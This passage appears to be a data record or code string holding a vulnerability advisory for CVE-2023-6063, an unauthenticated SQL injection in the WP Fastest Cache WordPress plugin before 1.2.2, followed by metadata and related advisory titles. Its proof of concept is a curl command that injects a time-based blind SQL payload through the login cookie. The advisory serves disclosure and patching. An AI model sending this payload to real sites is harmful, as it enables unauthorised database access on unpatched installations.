\t\t\tThe plugin does not properly sanitise and escape a parameter before using it in a SQL statement, leading to a SQL injection exploitable by unauthenticated users."""
full_description = 'WordPress Plugin Vulnerabilities WP Fastest Cache < 1.2.2 - Unauthenticated SQL Injection Description The plugin does not properly sanitise and escape a parameter before using it in a SQL statement, leading to a SQL injection exploitable by unauthenticated users. Proof of Concept 1. Visit WP Fastest Cache > Settings. Ensure "Cache System" is enabled, and "Logged-in Users" is disabled. Click "Submit" at the bottom. 2. The following curl command demonstrates the SQLi: curl https://example.com -H "Cookie: wordpress_logged_in=1234%22%20AND%20(SELECT%202537%20FROM%20(SELECT(SLEEP(5)))Sazm)%20AND%20%22qzts%22=%22qzts" Affects Plugins wp-fastest-cache Fixed in 1.2.2 References CVE CVE-2023-6063 URL https://wpscan.com/blog/unauthenticated-sql-injection-vulnerability-addressed-in-wp-fastest-cache-1-2-2/ Classification Type SQLI OWASP top 10 A1: Injection CWE CWE-89 CVSS 8.6 (high) Miscellaneous Original Researcher Alex Sanford Submitter Alex Sanford Submitter website https://wpscan.com Verified Yes WPVDB ID 30a74105-8ade-4198-abe2-1c6f2967443e Timeline Publicly Published 2023-11-13 (about 1 year ago) Added 2023-11-13 (about 1 year ago) Last Updated 2023-11-14 (about 1 year ago) Other Published Title Published 2023-10-30 Title Image vertical reel scroll slideshow < 9.1 - Authenticated (Subscriber+) SQL Injection via Shortcode Published 2025-01-03 Title ARPrice <= 4.0.3 - Unauthenticated SQL Injection Published 2014-08-01 Title ripe-hd-player 1.0 - ripe-hd-player/config.php id Parameter SQL Injection Published 2022-12-05 Title Contest Gallery < 19.1.5 - Admin+ SQL Injection Published 2025-01-03 Title Contact Form 7 Database – CFDB7 <= 1.0.0 - Authenticated (Administrator+) SQL Injection'
